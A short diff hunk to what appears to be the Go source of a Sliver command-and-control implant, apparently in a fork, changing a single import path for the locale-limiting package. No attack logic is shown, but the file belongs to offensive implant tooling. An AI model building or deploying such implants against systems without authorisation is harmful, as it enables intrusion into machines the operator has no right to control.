@@ -45,7 +45,7 @@ import (
 	// {{else}}{{end}}
 
 	// {{if .Config.LimitLocale}}
-	"4zreco/sliver/implant/sliver/locale"
+	"4zreco/var/sliver/implant/sliver/locale"
 	// {{end}}
 )
 
